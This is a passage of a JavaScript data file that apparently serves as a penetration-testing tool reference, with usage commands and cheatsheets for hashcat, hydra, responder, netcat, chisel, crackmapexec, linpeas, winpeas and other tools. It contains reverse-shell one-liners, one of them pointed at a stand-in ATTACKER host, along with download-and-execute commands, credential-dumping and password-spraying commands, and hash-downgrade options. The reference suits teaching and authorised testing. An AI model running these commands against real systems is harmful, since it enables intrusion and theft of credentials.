      { cmd: "hashcat -m 22000 handshake.hc22000 wordlist.txt", desc: "WPA2 PMKID/handshake cracking" },
      { cmd: "hashcat -m 0 -a 3 --increment --increment-min 6 --increment-max 10 hashes.txt '?a?a?a?a?a?a?a?a?a?a'", desc: "Incremental brute force 6-10 chars" }
    ],
    common_flags: [
      { flag: "-m", desc: "Hash type (0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt, etc.)" },
      { flag: "-a", desc: "Attack mode (0=dict, 1=combinator, 3=bruteforce, 6=hybrid dict+mask, 7=hybrid mask+dict)" },
      { flag: "-w", desc: "Workload profile (1=low, 2=default, 3=high, 4=nightmare)" },
      { flag: "-r", desc: "Rules file" },
      { flag: "-o", desc: "Output file for cracked passwords" },
      { flag: "--show", desc: "Show cracked passwords from potfile" },
      { flag: "--increment", desc: "Enable mask length incrementing" },
      { flag: "--increment-min/--increment-max", desc: "Minimum/maximum mask length" },
      { flag: "-O", desc: "Enable optimized kernels (limits password length)" },
      { flag: "--session", desc: "Name the session" },
      { flag: "--restore", desc: "Restore a saved session" },
      { flag: "--username", desc: "Ignore username in hash file (user:hash format)" },
      { flag: "-D", desc: "OpenCL device types (1=CPU, 2=GPU, 3=FPGA)" },
      { flag: "--example-hashes", desc: "Show example hashes for each mode" },
      { flag: "--benchmark", desc: "Benchmark all hash types" },
      { flag: "--force", desc: "Force execution (ignore warnings)" },
      { flag: "--potfile-disable", desc: "Don't use potfile" }
    ],
    output_format: "Real-time cracking status with speed, progress, ETA. Cracked hashes stored in hashcat.potfile.",
    cheatsheet: [
      "hashcat -m 0 md5.txt rockyou.txt -r rules/best64.rule",
      "hashcat -m 1000 ntlm.txt rockyou.txt -r rules/InsidePro-PasswordsPro.rule",
      "hashcat -m 1800 shadow.txt rockyou.txt",
      "hashcat -m 3200 bcrypt.txt rockyou.txt -w 3",
      "hashcat -m 13100 kerberoast.txt rockyou.txt",
      "hashcat -m 5600 ntlmv2.txt rockyou.txt",
      "hashcat -m 22000 wifi.hc22000 rockyou.txt",
      "hashcat -m 0 -a 3 hashes.txt '?u?l?l?l?d?d?d?s'",
      "hashcat -m 0 -a 6 hashes.txt rockyou.txt '?d?d?d'",
      "hashcat --benchmark -D 2",
      "hashcat --show -m 0 hashes.txt",
      "hashcat --example-hashes | grep -i 'kerberos'"
    ],
    related_tools: ["john", "hydra", "hash-identifier"]
  },

  {
    name: "hydra",
    category: "password",
    description: "Fast and flexible online password brute-forcing tool. Supports over 50 protocols including SSH, FTP, HTTP, HTTPS, SMB, LDAP, MySQL, PostgreSQL, RDP, VNC, SMTP, POP3, IMAP, Telnet, and more. Uses parallelized connections for speed.",
    website: "https://github.com/vanhauser-thc/thc-hydra",
    install: "sudo apt install hydra",
    basic_usage: [
      { cmd: "hydra -l admin -P wordlist.txt TARGET ssh", desc: "SSH brute force" },
      { cmd: "hydra -l admin -P wordlist.txt TARGET ftp", desc: "FTP brute force" },
      { cmd: "hydra -L users.txt -P passes.txt TARGET ssh", desc: "Multiple users and passwords" },
      { cmd: "hydra -l admin -P wordlist.txt TARGET mysql", desc: "MySQL brute force" },
      { cmd: "hydra -l admin -P wordlist.txt TARGET rdp", desc: "RDP brute force" }
    ],
    advanced_usage: [
      { cmd: "hydra -l admin -P wordlist.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'", desc: "HTTP POST form brute force" },
      { cmd: "hydra -l admin -P wordlist.txt TARGET http-get-form '/login:user=^USER^&pass=^PASS^:F=denied'", desc: "HTTP GET form brute force" },
      { cmd: "hydra -l admin -P wordlist.txt -s 8080 TARGET http-get /admin", desc: "HTTP Basic auth on custom port" },
      { cmd: "hydra -C creds.txt TARGET ssh", desc: "Colon-separated user:pass file" },
      { cmd: "hydra -l admin -P wordlist.txt -t 4 -w 30 TARGET ssh", desc: "4 threads, 30 sec timeout" },
      { cmd: "hydra -l admin -P wordlist.txt -e nsr TARGET ssh", desc: "Try null password, same as login, reversed login" },
      { cmd: "hydra -l admin -P wordlist.txt TARGET smb", desc: "SMB brute force" },
      { cmd: "hydra -l admin -P wordlist.txt TARGET vnc", desc: "VNC brute force" }
    ],
    common_flags: [
      { flag: "-l", desc: "Single login name" },
      { flag: "-L", desc: "File of login names" },
      { flag: "-p", desc: "Single password" },
      { flag: "-P", desc: "File of passwords" },
      { flag: "-C", desc: "Colon-separated user:pass file" },
      { flag: "-t", desc: "Number of parallel connections (default 16)" },
      { flag: "-w", desc: "Max wait time for responses (seconds)" },
      { flag: "-s", desc: "Custom port number" },
      { flag: "-e nsr", desc: "Try: n=null password, s=login as password, r=reversed login" },
      { flag: "-f", desc: "Exit after first found user/password pair" },
      { flag: "-o", desc: "Output file" },
      { flag: "-V", desc: "Verbose mode (show each attempt)" },
      { flag: "-I", desc: "Ignore restore file" },
      { flag: "-M", desc: "File containing target hosts" },
      { flag: "-x", desc: "Password generation (min:max:charset)" },
      { flag: "-u", desc: "Try all users before moving to next password" }
    ],
    output_format: "Real-time status with found credentials highlighted. Results saved to output file if specified.",
    cheatsheet: [
      "hydra -l admin -P rockyou.txt TARGET ssh -t 4",
      "hydra -L users.txt -P passes.txt TARGET ftp -t 10",
      "hydra -l root -P wordlist.txt TARGET mysql -f",
      "hydra -l admin -P wordlist.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:F=Login failed'",
      "hydra -l admin -P wordlist.txt -s 3389 TARGET rdp",
      "hydra -C default_creds.txt TARGET ssh",
      "hydra -L users.txt -P passes.txt TARGET smb -t 4",
      "hydra -l admin -P wordlist.txt TARGET vnc -s 5900",
      "hydra -l admin -P wordlist.txt TARGET telnet",
      "hydra -l sa -P wordlist.txt TARGET mssql"
    ],
    related_tools: ["medusa", "ncrack", "john", "hashcat"]
  },

  // ============================================================================
  // NETWORK TOOLS
  // ============================================================================

  {
    name: "wireshark",
    category: "network",
    description: "The world's foremost and widely-used network protocol analyzer. Deep inspection of hundreds of protocols with live capture and offline analysis. Features rich display filters, VoIP analysis, decryption of many protocols, and export to multiple formats. tshark is the command-line equivalent.",
    website: "https://www.wireshark.org",
    install: "sudo apt install wireshark tshark",
    basic_usage: [
      { cmd: "wireshark", desc: "Launch Wireshark GUI" },
      { cmd: "tshark -i eth0", desc: "CLI capture on interface" },
      { cmd: "tshark -i eth0 -w capture.pcap", desc: "Save capture to file" },
      { cmd: "tshark -r capture.pcap", desc: "Read a capture file" },
      { cmd: "tshark -i eth0 -f 'port 80'", desc: "Capture filter for port 80" },
      { cmd: "tshark -i eth0 -Y 'http.request'", desc: "Display filter for HTTP requests" }
    ],
    advanced_usage: [
      { cmd: "tshark -r capture.pcap -Y 'http.request.method==POST' -T fields -e http.host -e http.request.uri -e http.file_data", desc: "Extract POST data" },
      { cmd: "tshark -r capture.pcap -Y 'dns' -T fields -e dns.qry.name -e dns.a", desc: "Extract DNS queries and answers" },
      { cmd: "tshark -r capture.pcap -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn", desc: "SYN scan detection" },
      { cmd: "tshark -r capture.pcap -z conv,tcp", desc: "TCP conversation statistics" },
      { cmd: "tshark -r capture.pcap -z io,phs", desc: "Protocol hierarchy statistics" },
      { cmd: "tshark -r capture.pcap --export-objects http,./exported", desc: "Export HTTP objects (files)" },
      { cmd: "tshark -r capture.pcap -o 'tls.keylog_file:sslkeys.log' -Y 'http2'", desc: "Decrypt TLS with key log" }
    ],
    common_flags: [
      { flag: "-i", desc: "Interface to capture on" },
      { flag: "-w", desc: "Write output to file" },
      { flag: "-r", desc: "Read from capture file" },
      { flag: "-f", desc: "Capture filter (BPF syntax)" },
      { flag: "-Y", desc: "Display filter (Wireshark filter syntax)" },
      { flag: "-T", desc: "Output format (fields, json, pdml, psml, ek)" },
      { flag: "-e", desc: "Field to extract (with -T fields)" },
      { flag: "-c", desc: "Number of packets to capture" },
      { flag: "-a", desc: "Autostop condition (duration:sec, filesize:KB, files:N)" },
      { flag: "-z", desc: "Statistics (conv,tcp; io,stat; etc.)" },
      { flag: "--export-objects", desc: "Export protocol objects (http, smb, imf, tftp, dicom)" },
      { flag: "-o", desc: "Override preference setting" },
      { flag: "-D", desc: "List available interfaces" },
      { flag: "-q", desc: "Quiet mode (suppress packet output)" }
    ],
    output_format: "GUI: packet list with protocol tree. CLI: one line per packet or custom field extraction. Supports pcap, pcapng, JSON, PDML, CSV.",
    cheatsheet: [
      "tshark -i eth0 -w capture.pcap -a duration:300",
      "tshark -r capture.pcap -Y 'http.request' -T fields -e http.host -e http.request.uri",
      "tshark -r capture.pcap -Y 'tcp.port==445' -z conv,tcp",
      "tshark -r capture.pcap -Y 'ftp.request.command==PASS' -T fields -e ftp.request.arg",
      "tshark -r capture.pcap -z io,stat,30,'COUNT(frame)frame','SUM(frame.len)frame'",
      "tshark -r capture.pcap --export-objects http,./http_files",
      "tshark -r capture.pcap -Y 'dns.flags.response==0' -T fields -e dns.qry.name | sort | uniq -c | sort -rn",
      "tshark -r capture.pcap -Y 'icmp.type==8' -T fields -e ip.src -e ip.dst",
      "tshark -i eth0 -f 'not port 22' -c 1000 -w filtered.pcap"
    ],
    related_tools: ["tcpdump", "ettercap", "bettercap"]
  },

  {
    name: "tcpdump",
    category: "network",
    description: "Command-line packet analyzer. Captures and displays network packets matching a filter expression using the Berkeley Packet Filter (BPF) syntax. Lightweight, available on nearly all Unix systems, and the de facto tool for quick packet captures.",
    website: "https://www.tcpdump.org",
    install: "sudo apt install tcpdump  # usually pre-installed",
    basic_usage: [
      { cmd: "tcpdump -i eth0", desc: "Capture all traffic on interface" },
      { cmd: "tcpdump -i eth0 -w capture.pcap", desc: "Save to file" },
      { cmd: "tcpdump -r capture.pcap", desc: "Read from file" },
      { cmd: "tcpdump -i eth0 port 80", desc: "Filter by port" },
      { cmd: "tcpdump -i eth0 host 192.168.1.1", desc: "Filter by host" },
      { cmd: "tcpdump -i eth0 -n -c 100", desc: "Capture 100 packets, no DNS resolution" }
    ],
    advanced_usage: [
      { cmd: "tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0'", desc: "Capture only SYN packets" },
      { cmd: "tcpdump -i eth0 -A 'port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'", desc: "HTTP traffic with ASCII payload" },
      { cmd: "tcpdump -i eth0 -vvv -X host TARGET", desc: "Verbose hex+ASCII dump" },
      { cmd: "tcpdump -i eth0 -nn -G 3600 -w 'capture_%Y%m%d_%H%M%S.pcap'", desc: "Rotate captures hourly" },
      { cmd: "tcpdump -i eth0 'icmp[icmptype] == icmp-echo'", desc: "Capture only ping requests" }
    ],
    common_flags: [
      { flag: "-i", desc: "Interface to listen on" },
      { flag: "-w", desc: "Write raw packets to file" },
      { flag: "-r", desc: "Read packets from file" },
      { flag: "-c", desc: "Number of packets to capture" },
      { flag: "-n", desc: "Don't resolve hostnames" },
      { flag: "-nn", desc: "Don't resolve hostnames or port names" },
      { flag: "-v/-vv/-vvv", desc: "Verbosity level" },
      { flag: "-A", desc: "Print each packet in ASCII" },
      { flag: "-X", desc: "Print hex and ASCII" },
      { flag: "-e", desc: "Print link-layer header" },
      { flag: "-q", desc: "Quick (quiet) output" },
      { flag: "-s", desc: "Snap length (bytes to capture, 0=full)" },
      { flag: "-G", desc: "Rotate dump file every N seconds" },
      { flag: "-C", desc: "Rotate dump file at N MB" },
      { flag: "-D", desc: "List available interfaces" }
    ],
    output_format: "One line per packet with timestamp, source, destination, protocol info. Binary pcap format when writing to file.",
    cheatsheet: [
      "tcpdump -i eth0 -nn -c 500 -w capture.pcap",
      "tcpdump -i eth0 host 10.10.10.10 and port 80",
      "tcpdump -i eth0 'tcp port 443' -A | grep -i 'host:'",
      "tcpdump -i eth0 -nn 'udp port 53' -c 100",
      "tcpdump -i eth0 net 192.168.1.0/24",
      "tcpdump -r capture.pcap -nn | head -50",
      "tcpdump -i any -nn port 22 -c 10",
      "tcpdump -i eth0 '(tcp[13] & 2 != 0)' -nn"
    ],
    related_tools: ["wireshark", "tshark", "bettercap"]
  },

  {
    name: "responder",
    category: "network",
    description: "LLMNR, NBT-NS, and MDNS poisoner. Answers LLMNR, NBT-NS, and MDNS queries on the local network to capture NTLMv1/v2 hashes, HTTP/SMB/LDAP credentials, and more. Essential tool for internal network penetration testing to capture authentication hashes for offline cracking.",
    website: "https://github.com/lgandx/Responder",
    install: "sudo apt install responder  # or git clone from GitHub",
    basic_usage: [
      { cmd: "responder -I eth0", desc: "Start poisoning on interface" },
      { cmd: "responder -I eth0 -dwP", desc: "Full mode: DHCP, WPAD, ProxyAuth" },
      { cmd: "responder -I eth0 -A", desc: "Analyze mode (listen without poisoning)" },
      { cmd: "responder -I eth0 -v", desc: "Verbose mode" }
    ],
    advanced_usage: [
      { cmd: "responder -I eth0 -dwP -e ATTACKER_IP", desc: "Force external IP for answers" },
      { cmd: "responder -I eth0 -b -F", desc: "Enable HTTP Basic auth and force WPAD auth" },
      { cmd: "responder -I eth0 --disable-ess", desc: "Downgrade NTLMv2 to NTLMv1 for easier cracking" },
      { cmd: "cat /usr/share/responder/logs/Responder-Session.log", desc: "View captured hashes" },
      { cmd: "hashcat -m 5600 hashes.txt rockyou.txt", desc: "Crack captured NTLMv2 hashes" }
    ],
    common_flags: [
      { flag: "-I", desc: "Interface to listen on" },
      { flag: "-A", desc: "Analyze mode (passive, no poisoning)" },
      { flag: "-v", desc: "Verbose mode" },
      { flag: "-d", desc: "Enable DHCP listener" },
      { flag: "-w", desc: "Enable WPAD rogue proxy" },
      { flag: "-P", desc: "Force NTLM auth for WPAD" },
      { flag: "-F", desc: "Force authentication for WPAD" },
      { flag: "-b", desc: "Return HTTP Basic auth instead of NTLM" },
      { flag: "-e", desc: "External IP to use in responses" },
      { flag: "--disable-ess", desc: "Disable Extended Session Security (downgrades NTLMv2 to v1)" },
      { flag: "--lm", desc: "Force LM hashing downgrade" }
    ],
    output_format: "Real-time display of poisoned queries and captured credentials. Hashes saved to /usr/share/responder/logs/.",
    cheatsheet: [
      "responder -I eth0 -dwP",
      "responder -I eth0 -A -v",
      "responder -I eth0 -b -F",
      "hashcat -m 5600 /usr/share/responder/logs/HTTP-NTLMv2-*.txt rockyou.txt",
      "john --format=netntlmv2 /usr/share/responder/logs/SMB-NTLMv2-*.txt"
    ],
    related_tools: ["impacket", "crackmapexec", "bettercap"]
  },

  {
    name: "netcat",
    category: "network",
    description: "The 'Swiss army knife' of networking. Reads and writes data across network connections using TCP or UDP. Used for port scanning, banner grabbing, file transfer, reverse shells, and as a simple network debugging tool. ncat (Nmap's version) adds SSL support and access control.",
    website: "https://nmap.org/ncat/",
    install: "sudo apt install ncat netcat-openbsd  # ncat recommended",
    basic_usage: [
      { cmd: "nc -nv TARGET 80", desc: "Connect to a host on port 80" },
      { cmd: "nc -lvnp 4444", desc: "Listen on port 4444" },
      { cmd: "nc -z TARGET 1-1000", desc: "Port scan (zero I/O mode)" },
      { cmd: "echo 'GET / HTTP/1.0\\r\\n\\r\\n' | nc TARGET 80", desc: "Banner grab" },
      { cmd: "nc -lvnp 4444 > received_file", desc: "Receive a file" }
    ],
    advanced_usage: [
      { cmd: "nc -e /bin/bash TARGET 4444", desc: "Reverse shell (traditional nc)" },
      { cmd: "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc TARGET 4444 > /tmp/f", desc: "Reverse shell (no -e flag)" },
      { cmd: "ncat --ssl TARGET 443", desc: "Connect with SSL (ncat)" },
      { cmd: "ncat -lvnp 4444 --ssl", desc: "SSL listener (ncat)" },
      { cmd: "ncat --sh-exec 'ncat TARGET2 80' -lvnp 8080 --keep-open", desc: "Port forwarding/relay" },
      { cmd: "cat file | nc -lvnp 4444", desc: "Serve a file on a port" }
    ],
    common_flags: [
      { flag: "-l", desc: "Listen mode" },
      { flag: "-v", desc: "Verbose" },
      { flag: "-n", desc: "Numeric only (no DNS resolution)" },
      { flag: "-p", desc: "Local port number" },
      { flag: "-e", desc: "Execute program after connect" },
      { flag: "-z", desc: "Zero I/O mode (scanning)" },
      { flag: "-w", desc: "Timeout (seconds)" },
      { flag: "-u", desc: "UDP mode" },
      { flag: "-k", desc: "Keep listening after disconnect" },
      { flag: "--ssl", desc: "Connect/listen with SSL (ncat)" },
      { flag: "--sh-exec", desc: "Execute shell command via /bin/sh (ncat)" },
      { flag: "--allow", desc: "Allow only specific hosts (ncat)" }
    ],
    output_format: "Raw TCP/UDP stream data to stdout.",
    cheatsheet: [
      "nc -lvnp 4444",
      "nc -nv TARGET 80",
      "nc -z -v TARGET 1-1000 2>&1 | grep 'open'",
      "echo '' | nc -nv -w1 TARGET 80",
      "bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
      "ncat --ssl -lvnp 443",
      "nc -lvnp 9001 < file_to_send",
      "nc TARGET 9001 > received_file"
    ],
    related_tools: ["socat", "chisel", "proxychains"]
  },

  {
    name: "chisel",
    category: "network",
    description: "Fast TCP/UDP tunnel transported over HTTP and secured via SSH. Useful for pivoting through firewalls and NATs. Client-server model where the server runs on the attacker's machine and the client on the target. Supports forward and reverse port forwarding, SOCKS5 proxy, and more.",
    website: "https://github.com/jpillora/chisel",
    install: "go install github.com/jpillora/chisel@latest  # or download binary from GitHub",
    basic_usage: [
      { cmd: "chisel server -p 8080 --reverse", desc: "Start server with reverse tunneling" },
      { cmd: "chisel client ATTACKER:8080 R:8001:127.0.0.1:8001", desc: "Reverse forward local port to attacker" },
      { cmd: "chisel client ATTACKER:8080 R:socks", desc: "Create reverse SOCKS5 proxy" },
      { cmd: "chisel server -p 8080", desc: "Start server (forward mode)" },
      { cmd: "chisel client ATTACKER:8080 3306:10.10.10.5:3306", desc: "Forward remote MySQL to local" }
    ],
    advanced_usage: [
      { cmd: "chisel server -p 443 --reverse --socks5 --auth user:pass", desc: "Authenticated reverse SOCKS" },
      { cmd: "chisel client --auth user:pass ATTACKER:443 R:socks", desc: "Authenticated client" },
      { cmd: "chisel client ATTACKER:8080 R:9090:172.16.0.5:80 R:9091:172.16.0.5:443", desc: "Multiple reverse forwards" },
      { cmd: "proxychains nmap -sT -p- 10.10.10.0/24", desc: "Use SOCKS proxy with nmap" }
    ],
    common_flags: [
      { flag: "server", desc: "Run in server mode" },
      { flag: "client", desc: "Run in client mode" },
      { flag: "-p / --port", desc: "Server listening port" },
      { flag: "--reverse", desc: "Allow reverse port forwarding" },
      { flag: "--socks5", desc: "Allow SOCKS5 connections" },
      { flag: "--auth", desc: "Authentication (user:pass)" },
      { flag: "R:", desc: "Reverse tunnel prefix (client)" },
      { flag: "--keepalive", desc: "Keepalive interval (default 25s)" },
      { flag: "--max-retry-count", desc: "Maximum reconnection attempts" },
      { flag: "--fingerprint", desc: "Require specific server fingerprint" }
    ],
    output_format: "Server/client status messages. Silent tunnel operation.",
    cheatsheet: [
      "# Reverse SOCKS proxy: attacker runs server, target runs client",
      "chisel server -p 8080 --reverse",
      "chisel client ATTACKER:8080 R:socks",
      "# Then: proxychains nmap -sT TARGET",
      "# Reverse port forward:",
      "chisel server -p 8080 --reverse",
      "chisel client ATTACKER:8080 R:3306:127.0.0.1:3306",
      "# Forward port:",
      "chisel server -p 8080",
      "chisel client ATTACKER:8080 8888:10.10.10.5:80"
    ],
    related_tools: ["proxychains", "socat", "netcat", "ligolo-ng"]
  },

  // ============================================================================
  // ENUMERATION TOOLS
  // ============================================================================

  {
    name: "crackmapexec",
    category: "enumeration",
    description: "Swiss army knife for pentesting Active Directory and Windows networks. Supports SMB, WinRM, LDAP, MSSQL, SSH, RDP, and more. Automates credential testing, command execution, enumeration of shares/users/groups, and post-exploitation across multiple hosts simultaneously. Now maintained as NetExec (nxc).",
    website: "https://github.com/Pennyw0rth/NetExec",
    install: "pipx install git+https://github.com/Pennyw0rth/NetExec  # or apt install crackmapexec",
    basic_usage: [
      { cmd: "crackmapexec smb 192.168.1.0/24", desc: "SMB network scan (enumerate hosts)" },
      { cmd: "crackmapexec smb TARGET -u user -p 'pass'", desc: "Test credentials" },
      { cmd: "crackmapexec smb TARGET -u user -p 'pass' --shares", desc: "List SMB shares" },
      { cmd: "crackmapexec smb TARGET -u user -p 'pass' --users", desc: "Enumerate domain users" },
      { cmd: "crackmapexec smb TARGET -u user -H 'NTLM_HASH' --shares", desc: "Pass the hash" }
    ],
    advanced_usage: [
      { cmd: "crackmapexec smb TARGET -u user -p pass -x 'whoami'", desc: "Execute command via SMB" },
      { cmd: "crackmapexec smb TARGET -u user -p pass --sam", desc: "Dump SAM hashes" },
      { cmd: "crackmapexec smb TARGET -u user -p pass --lsa", desc: "Dump LSA secrets" },
      { cmd: "crackmapexec smb TARGET -u user -p pass --ntds", desc: "Dump NTDS.dit (domain hashes)" },
      { cmd: "crackmapexec smb TARGETS -u users.txt -p passes.txt --no-bruteforce", desc: "Spray credentials (1 user per pass)" },
      { cmd: "crackmapexec winrm TARGET -u user -p pass -x 'ipconfig /all'", desc: "Execute via WinRM" },
      { cmd: "crackmapexec ldap TARGET -u user -p pass --bloodhound --collection All", desc: "Collect BloodHound data" },
      { cmd: "crackmapexec mssql TARGET -u sa -p pass --local-auth -q 'SELECT @@version'", desc: "MSSQL query" }
    ],
    common_flags: [
      { flag: "smb/winrm/ldap/mssql/ssh/rdp", desc: "Protocol to use" },
      { flag: "-u", desc: "Username(s) or file" },
      { flag: "-p", desc: "Password(s) or file" },
      { flag: "-H", desc: "NTLM hash(es) or file" },
      { flag: "-d", desc: "Domain" },
      { flag: "--local-auth", desc: "Authenticate locally instead of domain" },
      { flag: "-x", desc: "Execute command" },
      { flag: "-X", desc: "Execute PowerShell command" },
      { flag: "--shares", desc: "Enumerate SMB shares" },
      { flag: "--users", desc: "Enumerate domain users" },
      { flag: "--groups", desc: "Enumerate domain groups" },
      { flag: "--sam", desc: "Dump SAM database" },
      { flag: "--lsa", desc: "Dump LSA secrets" },
      { flag: "--ntds", desc: "Dump NTDS.dit" },
      { flag: "--pass-pol", desc: "Dump password policy" },
      { flag: "--no-bruteforce", desc: "Spray mode (try each combo once)" },
      { flag: "--continue-on-success", desc: "Continue after finding valid creds" },
      { flag: "-M", desc: "Module to use" }
    ],
    output_format: "Color-coded results: green [+] = success, red [-] = failure, yellow [*] = info. Stores results in ~/.cme/.",
    cheatsheet: [
      "crackmapexec smb 10.10.10.0/24",
      "crackmapexec smb DC -u user -p pass --shares",
      "crackmapexec smb DC -u user -p pass --users --groups",
      "crackmapexec smb DC -u user -H hash --sam",
      "crackmapexec smb TARGETS -u user -p pass -x 'whoami /all'",
      "crackmapexec winrm TARGET -u user -p pass -x 'hostname'",
      "crackmapexec smb DC -u users.txt -p 'Summer2024!' --no-bruteforce",
      "crackmapexec ldap DC -u user -p pass --bloodhound -ns DC_IP --collection All",
      "crackmapexec smb DC -u user -p pass --ntds --users",
      "crackmapexec smb DC -u user -p pass -M spider_plus"
    ],
    related_tools: ["bloodhound", "impacket", "kerbrute", "enum4linux"]
  },

  {
    name: "bloodhound",
    category: "enumeration",
    description: "Active Directory attack path visualization tool. Uses graph theory to reveal hidden relationships and attack paths in an AD environment. Identifies shortest paths to Domain Admin, Kerberoastable users, AS-REP roastable users, delegation abuse paths, and more. SharpHound is the data collector.",
    website: "https://github.com/BloodHoundAD/BloodHound",
    install: "sudo apt install bloodhound  # also need neo4j database",
    basic_usage: [
      { cmd: "neo4j console", desc: "Start Neo4j database" },
      { cmd: "bloodhound", desc: "Launch BloodHound GUI" },
      { cmd: "SharpHound.exe -c All", desc: "Collect all data from domain-joined Windows" },
      { cmd: "bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c All", desc: "Collect from Linux (remote)" },
      { cmd: "Import ZIP file in BloodHound GUI", desc: "Upload collected data" }
    ],
    advanced_usage: [
      { cmd: "SharpHound.exe -c All --stealth", desc: "Stealthy collection (fewer queries)" },
      { cmd: "SharpHound.exe -c Session,LoggedOn --loop --looptime 00:05:00", desc: "Continuous session collection" },
      { cmd: "bloodhound-python -d domain.local -u user -p pass -c All --zip", desc: "Collect and auto-zip" },
      { cmd: "MATCH (n:User {owned:true}) RETURN n.name", desc: "Cypher query: find owned users" },
      { cmd: "MATCH p=shortestPath((a:User {owned:true})-[*1..]->(b:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})) RETURN p", desc: "Shortest path from owned to DA" }
    ],
    common_flags: [
      { flag: "-c / --collectionmethods", desc: "Collection methods: All, Default, Session, LoggedOn, Group, LocalAdmin, Trusts, ACL, ObjectProps, SPNTargets, Container" },
      { flag: "-d", desc: "Domain to collect from" },
      { flag: "-u", desc: "Username for authentication" },
      { flag: "-p", desc: "Password" },
      { flag: "-ns", desc: "Nameserver (DC IP) for DNS resolution" },
      { flag: "--stealth", desc: "Stealthy collection" },
      { flag: "--loop", desc: "Continuous collection mode" },
      { flag: "--looptime", desc: "Interval for loop collection" },
      { flag: "--zip", desc: "Auto-zip output files" },
      { flag: "--outputdirectory", desc: "Output directory" }
    ],
    output_format: "JSON files (zipped) imported into BloodHound GUI. Graph visualization with nodes (users, computers, groups, GPOs) and edges (permissions, sessions, group memberships).",
    cheatsheet: [
      "neo4j console  # start database first",
      "bloodhound  # launch GUI, connect to neo4j",
      "SharpHound.exe -c All",
      "bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c All --zip",
      "# Cypher queries in BloodHound:",
      "MATCH (m:Computer) WHERE m.unconstraineddelegation=true RETURN m",
      "MATCH (u:User) WHERE u.hasspn=true RETURN u",
      "MATCH (u:User) WHERE u.dontreqpreauth=true RETURN u",
      "MATCH p=(u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}) RETURN p"
    ],
    related_tools: ["crackmapexec", "impacket", "kerbrute"]
  },

  // ============================================================================
  // PRIVILEGE ESCALATION TOOLS
  // ============================================================================

  {
    name: "linpeas",
    category: "privesc",
    description: "Linux Privilege Escalation Awesome Script. Searches for possible paths to escalate privileges on Linux hosts. Checks kernel exploits, SUID binaries, writable files, cron jobs, capabilities, Docker/LXC membership, NFS, sudo misconfigurations, and hundreds of other vectors. Color-coded output highlights critical findings.",
    website: "https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS",
    install: "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
    basic_usage: [
      { cmd: "chmod +x linpeas.sh && ./linpeas.sh", desc: "Run with all checks" },
      { cmd: "./linpeas.sh -a", desc: "Run all checks including lengthy ones" },
      { cmd: "./linpeas.sh -s", desc: "Superfast mode (less checks)" },
      { cmd: "./linpeas.sh | tee linpeas_output.txt", desc: "Save output to file" },
      { cmd: "curl -L URL/linpeas.sh | sh", desc: "Download and run in memory" }
    ],
    advanced_usage: [
      { cmd: "./linpeas.sh -e /tmp/output", desc: "Export results to directory" },
      { cmd: "./linpeas.sh -P 'password123'", desc: "Test a specific password for sudo" },
      { cmd: "./linpeas.sh -d", desc: "Debug mode (show errors)" },
      { cmd: "./linpeas.sh -t", desc: "Network scan mode (check reachable hosts)" }
    ],
    common_flags: [
      { flag: "-a", desc: "All checks (including slow ones)" },
      { flag: "-s", desc: "Superfast mode" },
      { flag: "-e", desc: "Export directory for results" },
      { flag: "-P", desc: "Password to test for sudo" },
      { flag: "-d", desc: "Debug mode" },
      { flag: "-t", desc: "Network scan" },
      { flag: "-q", desc: "Quiet mode (less output)" },
      { flag: "-N", desc: "No colors (for piping)" }
    ],
    output_format: "Color-coded terminal output. Red/yellow = critical findings, green = interesting, light grey = low priority.",
    cheatsheet: [
      "./linpeas.sh 2>&1 | tee /tmp/linpeas.txt",
      "./linpeas.sh -a 2>&1 | tee /dev/shm/lp.txt",
      "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      "# Common escalation vectors linpeas finds:",
      "# - SUID binaries: find / -perm -4000 2>/dev/null",
      "# - Writable /etc/passwd",
      "# - Cron jobs running as root with writable scripts",
      "# - Capabilities: getcap -r / 2>/dev/null",
      "# - Docker group membership",
      "# - Kernel exploits (Dirty Pipe, etc.)"
    ],
    related_tools: ["winpeas", "linux-exploit-suggester", "pspy"]
  },

  {
    name: "winpeas",
    category: "privesc",
    description: "Windows Privilege Escalation Awesome Script. Searches for possible paths to escalate privileges on Windows hosts. Checks services, registry, scheduled tasks, credentials in files, UAC settings, token privileges, unquoted service paths, DLL hijacking, AlwaysInstallElevated, and more.",
    website: "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS",
    install: "Download from https://github.com/peass-ng/PEASS-ng/releases (winPEASx64.exe or winPEASany.exe)",
    basic_usage: [
      { cmd: "winPEASx64.exe", desc: "Run all checks" },
      { cmd: "winPEASany.exe quiet", desc: "Quiet mode (less output)" },
      { cmd: "winPEASx64.exe servicesinfo", desc: "Only service information" },
      { cmd: "winPEASx64.exe > output.txt", desc: "Save output to file" }
    ],
    advanced_usage: [
      { cmd: "winPEASx64.exe quiet cmd fast searchfast searchall", desc: "Maximum speed scan" },
      { cmd: "winPEASx64.exe log=C:\\temp\\winpeas.txt", desc: "Log to file" },
      { cmd: "winPEASx64.exe notcolor", desc: "No ANSI colors (for file output)" },
      { cmd: "IEX(New-Object Net.WebClient).downloadString('URL/winPEAS.ps1')", desc: "PowerShell version in memory" }
    ],
    common_flags: [
      { flag: "quiet", desc: "Less verbose output" },
      { flag: "cmd", desc: "Execute using cmd.exe instead of API calls" },
      { flag: "fast", desc: "Skip time-consuming checks" },
      { flag: "searchfast", desc: "Fast file search" },
      { flag: "searchall", desc: "Search all files" },
      { flag: "notcolor", desc: "No ANSI color codes" },
